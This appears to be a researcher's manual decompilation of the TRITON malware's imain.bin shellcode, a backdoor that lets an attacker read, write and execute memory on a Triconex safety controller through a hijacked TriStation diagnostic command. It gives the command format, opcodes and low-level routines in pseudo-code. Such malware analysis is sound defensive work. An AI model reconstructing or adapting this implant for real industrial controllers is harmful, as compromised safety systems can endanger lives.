/*
	TRITON imain.bin reverse-engineered shellcode for MPC860EN

	This file is a manual RE decompilation of the TRITON malware imain.bin shellcode.
	The shellcode is an implant backdoor which allows for read, writing and executing of safety controller memory.
	It is relocated by inject.bin in order for it to be executed before the TriStation 'get main processor diagnostic data' handler to piggy-back on that command.

	Commands to the backdoor are of the following form: [CMD (1 byte)] [MP (1 byte)] [field_0 (4 bytes)] [field_1 (4 bytes)] [field_2 (N bytes)]

	- Jos Wetzels, Midnight Blue (https://www.midnightbluelabs.com/), 2018
*/

#define M_READ_RAM  0x17
#define M_WRITE_RAM 0x41
#define M_EXECUTE   0xF9

struct argument_struct
{
	uint16_t unknown_ui16_00;
	uint8_t unknown_ui8_02;
	uint16_t return_value;
	uint8_t cmd;				// cmd field
	uint8_t mp;				    // mp field
	uint32_t field_0;			// argument field 0 (eg. size)
	uint32_t field_1;			// argument field 1 (eg. address)
	uint8_t  field_3[...];      // argument field 3 (eg. data)
};

void imain(void)
{
	arg = (struct argument_struct*)get_argument();
	// Retrieve implant command and MP value
	cmd = arg->cmd;
	mp = arg->mp;
	compare_mp = *(uint8_t*)(0x199400);

	if ((mp == compare_mp) || (mp == 0xFF))
	{
		mp = arg->return_value;

		// Check implant command
		switch (cmd)
		{
			// Read N bytes from RAM at address X
			case M_READ_RAM:
			{
				if (mp >= 0x14)
				{
					size = arg->field_0;
					address = arg->field_1;

					if ((size > 0) && (size <= 0x400))
					{
						memcpy(&arg->cmd, address, size);
						return_value = (size + 0xA);
					}
					else
					{
						goto main_end;
					}
				}
				else
				{
					goto main_end;
				}

			}break;

			// Write N bytes to RAM at address X
			case M_WRITE_RAM:
			{
				size = arg->field_0;
				address = arg->field_1;
				data = arg->field_3;

				if ((size > 0) && (size == (mp - 0x14)))
				{
					reenable_address_translation = 0;

					if (address < 0x100000)
					{
						reenable_address_translation = 1;
						disable_address_translation();
					}

					memcpy(address, &data, size);

					if (reenable_address_translation == 1)
					{
						enable_address_translation();
					}

					return_value = 0xA;
				}
				else
				{
					goto main_end;
				}

			}break;

			// Execute function at address X
			case M_EXECUTE:
			{
				if (mp >= 0x10)
				{
					function_ptr = arg->field_0;

					if (function_ptr < 0x100000)
					{
						call(function_ptr);
						return_value = 0xA;
					}
					else
					{
						goto main_end;
					}
				}
				else
				{
					goto main_end;
				}

			}break;
		}

		switch_end:
			arg->unknown_ui8_02 = 0x96;
			arg->return_value = return_value;
			tristation_mp_diagnostic_data_response();

	}

	// This most likely continues with the actual TriStation 'get main processor diagnostic data' handler
	main_end:
		jump(0x3A0B0);
}

void disable_address_translation(void)
{
	mtpsr eid, r3;	// External Interrupt Disable (EID) = r3
	r4 = -0x40;		// 11111111111111111111111111011000; Sets IR=0 (Instruction address translation is disabled), DR=1 (Data address translation is enabled)
	mfmsr r3;		// r3 = Machine State Register
	r3 = r4 & r3;	// Disable instruction address translation
	mtmsr r3;		// Machine State Register = r3
	return;
}

void enable_address_translation(void)
{
	r3 = 0xC000000;		// 00001100000000000000000000000000; IC_CST CMD = 110 (Instruction cache invalidate all command)
	mtspr ic_csr, r3;	// Instruction Cache Control and Status Register = r3.
	isync;				// Synchronize context, flush instruction queue
	mfmsr r3; 			// r3 = Machine State Register
	r3 |= 0x30; 		// 110000; Sets IR=1 (Instruction address translation is enabled), DR=1 (Data address translation is enabled)
	mtmsr r3; 			// Machine State Register = r3
	sync; 				// Ordering to ensure all instructions initiated prior to the sync instruction complete and no subsequent ones initiate until synced
	mtspr eie, r3; 		// External Interrupt Enable (EIE) = r3
	return;
}

// This most likely retrieves the argument to the TriStation 'get main processor diagnostic data' command
void get_argument(void)
{
	r3 = r31;
	jump(0x6B9CC);
}

// This most likely sends a response to the TriStation 'get main processor diagnostic data' command
void tristation_mp_diagnostic_data_response(void)
{
	r3 = r31;
	jump(0x68F0C);
}
